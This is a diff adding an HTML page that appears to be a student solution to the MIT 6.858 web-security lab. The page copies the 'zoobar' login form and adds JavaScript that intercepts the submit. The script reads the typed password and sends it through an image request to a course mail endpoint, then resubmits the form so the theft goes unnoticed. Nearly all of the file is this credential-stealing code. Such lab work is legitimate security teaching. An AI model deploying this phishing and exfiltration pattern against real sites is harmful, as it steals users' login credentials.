@@ -1,0 +1,50 @@
+
+<form name="loginform" method="POST" action="http://localhost:8080/zoobar/index.cgi/login">
+<table>
+<tr>
+   <td>Username:</td>
+  <td><input type="text" name="login_username" size="20"
+  autocomplete="no" value=""></td>
+</tr>
+<tr>
+   <td>Password:</td>
+  <td colspan=2><input type="password" name="login_password" size=20 autocomplete="no">
+  <input type="submit" name="submit_login" value="Log in">
+  <input type="submit" name="submit_registration" value="Register"></td>
+</tr>
+</table>
+<input type="hidden" name="nexturl" value="/zoobar/index.cgi/">
+</form>
+
+
+<script type="text/javascript">
+    // this work!
+    // setTimeout(function (argument) {
+    //      alert("hello"); 
+    // },1000);
+
+    var loginform = document.getElementsByName("loginform")[0];
+    var password = document.getElementsByName("login_password")[0];
+    loginform.addEventListener("submit",function (event) {
+        console.log("submit");
+        console.log("password:");
+        console.log(password["value"]);
+        event.preventDefault();
+
+        //模拟一次耗时请求，相当于发邮件。
+        setTimeout(function (argument) {
+            alert(password["value"]);   
+
+            (new Image()).src='http://css.csail.mit.edu/6.858/2015/labs/sendmail.php?' + 'to=sombody@mit.edu' + '&payload=' + password["value"] + '&random=' + Math.random();
+        },1000);
+
+        // 当确定邮件已发送后，重新提交表单
+        setTimeout(function (argument) {
+            //loginform.removeEventListener("submit", this);
+            loginform.submit();
+        },2000);        
+
+        loginform.removeEventListener("submit", this);
+
+    },false);
+</script>
